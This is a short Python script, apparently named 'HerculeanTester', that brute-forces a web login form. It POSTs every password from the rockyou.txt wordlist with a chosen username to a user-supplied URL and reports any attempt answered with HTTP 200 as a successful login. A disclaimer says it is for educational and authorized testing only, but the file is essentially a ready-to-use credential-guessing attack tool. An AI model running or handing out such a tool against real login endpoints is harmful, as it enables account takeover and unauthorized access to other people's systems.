import requests

# Define ANSI escape codes for color formatting
red = "\033[91m"
green = "\033[92m"
blue = "\033[94m"
normal = "\033[0m"

# Warning message
print("\n" + red + "[*]Warning: This script is intended for educational and authorized testing purposes only.")
print("Unauthorized or malicious use of this script is illegal and unethical.")
print("The developer does not support or endorse any malicious usage of this script." + normal + "\n")


# Credit text
print(f"{blue}[*]  HerculeanTester (For Educational and Authorized Testing){normal}")
print(f"{blue}[*]Credit:Morta1DieTw1Ce{normal}\n")


# Get user input for the target URL and username
url = input(f"{blue}[*]Enter the target URL (e.g., https://example.com/api/endpoint): {normal}")
username = input(f"{blue}[*]Enter the username:{normal} ")

# Define the password file (rockyou.txt) and read passwords from it
password_file = "rockyou.txt"
with open(password_file, "r", encoding="utf-8", errors="ignore") as file:
    pass_list = file.read().splitlines()

def cracking(password):
    data = {
        'username': username,
        'password': password,
    }
    try:
        response = requests.post(url, data=data)

        if response.status_code == 200:
            print(f'{green}[*]Successful login with password: {password} and username {username}{normal}')
        elif response.status_code == 403:
         	  print(f'{red}[*]Unsuccessful login with password: {password}{normal}')
        else:
            print(f'{red}[*]Unsuccessful login with password: {password}{normal}')
    except Exception as e:
        print(f'{red}[*]Error: {e}{normal}')



# Iterate through the list of passwords and attempt to log in
for password in pass_list:
    cracking(password)
